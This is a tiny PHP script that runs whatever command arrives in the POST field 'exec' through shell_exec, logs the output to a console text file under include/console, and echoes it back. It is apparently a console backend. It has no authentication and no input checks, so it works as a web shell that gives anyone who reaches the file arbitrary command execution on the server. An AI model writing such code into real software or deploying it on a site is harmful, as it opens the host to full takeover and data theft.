<?php

$output = shell_exec($_POST['exec'].">> ../../include/console/console.txt");
echo "$output \n";